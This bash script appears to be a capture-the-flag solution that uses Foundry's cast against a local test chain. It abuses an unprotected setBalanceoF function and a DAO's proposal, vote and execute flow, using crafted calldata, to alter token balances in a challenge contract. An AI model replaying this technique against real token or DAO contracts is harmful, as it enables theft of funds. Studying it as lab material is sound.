#!/bin/bash
# Set the variables
PRIVATE_KEY_PLAYER="0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d"
TOKENADDRESS="0x5FbDB2315678afecb367f032d93F642f64180aa3"
DAOADDRESS="0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512"
ENDPOINT="http://127.0.0.1:8545"

ADDRESS_PLAYER=$(cast wallet address $PRIVATE_KEY_PLAYER)
ADDRESS_OWNER=$(cast parse-bytes32-address "$(cast storage $TOKENADDRESS 2 --rpc-url $ENDPOINT)")
#
# CHECKS BALANCE OF THE ACCOUNTS
checkBalance() {
	ADMIN_TOKENS=$(cast --to-dec $(cast call $TOKENADDRESS "getBalance(address)" $ADDRESS_OWNER --rpc-url $ENDPOINT --private-key $PRIVATE_KEY_PLAYER))
	DAO_TOKENS=$(cast --to-dec $(cast call $TOKENADDRESS "getBalance(address)" $DAOADDRESS --rpc-url $ENDPOINT --private-key $PRIVATE_KEY_PLAYER))
	PLAYER_TOKENS=$(cast --to-dec $(cast call $TOKENADDRESS "getBalance(address)" $ADDRESS_PLAYER --rpc-url $ENDPOINT --private-key $PRIVATE_KEY_PLAYER))

	echo "******************************************************"
	echo "Number of Cr3 Tokens of Admin  => " $ADMIN_TOKENS
	echo "Number of Cr3 Tokens of DAO    => " $DAO_TOKENS
	echo "Number of Cr3 Tokens of Player => " $PLAYER_TOKENS
	echo "******************************************************"
}

checkBalance

cast send $TOKENADDRESS "setBalanceoF(uint256, address, uint256)" 0 $ADDRESS_OWNER 1337000000000000000000 --rpc-url $ENDPOINT --private-key $PRIVATE_KEY_PLAYER >/dev/null
cast send $TOKENADDRESS "setBalanceoF(uint256, address, uint256)" 1 $ADDRESS_OWNER 1337000000000000000000 --rpc-url $ENDPOINT --private-key $PRIVATE_KEY_PLAYER >/dev/null
cast send $TOKENADDRESS "setBalanceoF(uint256, address, uint256)" 2 $ADDRESS_OWNER 1337000000000000000000 --rpc-url $ENDPOINT --private-key $PRIVATE_KEY_PLAYER >/dev/null
cast send $TOKENADDRESS "setBalanceoF(uint256, address, uint256)" 3 $ADDRESS_OWNER 1337000000000000000000 --rpc-url $ENDPOINT --private-key $PRIVATE_KEY_PLAYER >/dev/null
cast send $TOKENADDRESS "setBalanceoF(uint256, address, uint256)" 4 $ADDRESS_OWNER 1337000000000000000000 --rpc-url $ENDPOINT --private-key $PRIVATE_KEY_PLAYER >/dev/null

cast send $DAOADDRESS "createProposal(string)" Cr3 --rpc-url $ENDPOINT --private-key $PRIVATE_KEY_PLAYER >/dev/null
cast send $DAOADDRESS "createProposal(string)" Cr3 --rpc-url $ENDPOINT --private-key $PRIVATE_KEY_PLAYER >/dev/null
cast send $DAOADDRESS "createProposal(string)" Cr3 --rpc-url $ENDPOINT --private-key $PRIVATE_KEY_PLAYER >/dev/null
cast send $DAOADDRESS "createProposal(string)" Cr3 --rpc-url $ENDPOINT --private-key $PRIVATE_KEY_PLAYER >/dev/null
cast send $DAOADDRESS "createProposal(string)" Cr3 --rpc-url $ENDPOINT --private-key $PRIVATE_KEY_PLAYER >/dev/null

fsBytes=$(cast calldata "getBalanceoF(uint, address)" 4 $ADDRESS_OWNER)

cast send $DAOADDRESS "vote(uint256, bytes)" 4 $fsBytes --rpc-url $ENDPOINT --private-key $PRIVATE_KEY_PLAYER >/dev/null

cast send $DAOADDRESS "executeProposal(uint256, address, uint256)" 4 $ADDRESS_OWNER 1337 --rpc-url $ENDPOINT --private-key $PRIVATE_KEY_PLAYER >/dev/null

checkBalance

cast send $DAOADDRESS "coolCheck(uint8, uint, address)" 2 63 $ADDRESS_PLAYER --rpc-url $ENDPOINT --private-key $PRIVATE_KEY_PLAYER >/dev/null

checkBalance
